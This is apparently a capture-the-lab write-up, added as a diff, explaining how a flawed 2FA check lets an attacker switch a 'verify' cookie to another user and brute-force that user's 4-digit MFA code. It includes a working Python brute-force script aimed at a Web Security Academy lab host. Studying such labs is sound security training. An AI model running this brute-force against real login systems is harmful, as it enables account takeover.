@@ -1,0 +1,62 @@
+in this lab the user is asked to input their username and password, then
+a verification code is sent to them.
+
+the lab uses two /login points "/login" and "/login2"
+
+in the /login2 endpoint it contains a variable "verify"
+contining the name of the account being verified.
+
+therefore we can login using my credentials then proxy the /login2
+and change the verify value to carlos and brute force the MFA code sent 
+to carlos' emails
+
+since this code follows the format of "xxxx" the code could 
+be 0043, therefore using the min digits in the integer list to be 4
+digits long
+
+used python to brute force the MFA code, eventually got:
+0523
+
+however this will be different everytime
+
+this all came from the developer not knowing the verify variable was vulnerable
+
+
+python code used:
+
+import requests
+
+def main():
+    base_url = "https://0a5100b003736aff81d1c0b600500005.web-security-academy.net"
+    login_url = f"{base_url}/login2"
+
+    headers = {
+        'Host': '0a5100b003736aff81d1c0b600500005.web-security-academy.net',
+        'Cookie': 'verify=carlos; session=oqEYe25OuuTCjBdc0Ht5sS2RY0V6MZXK',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
+        # Add other headers as needed
+    }
+
+    for payload in range(1, 10000):
+        payload_str = f"{payload:04d}"  # Format the payload to have leading zeros if needed
+
+        data = {
+            'mfa-code': payload_str,
+        }
+
+        try:
+            response = requests.post(login_url, headers=headers, data=data, allow_redirects=False)
+
+            if response.status_code == 302:  # Adjust the status code as needed for redirects
+                print(f"Redirect detected for payload {payload_str}")
+                break  # Stop the loop if a redirect is detected
+
+            print(f"Payload: {payload_str}, Status Code: {response.status_code}")
+            # You can add more logic to check the response content, headers, etc.
+
+        except requests.RequestException as e:
+            print(f"Error for payload {payload_str}: {e}")
+
+if __name__ == "__main__":
+    main()
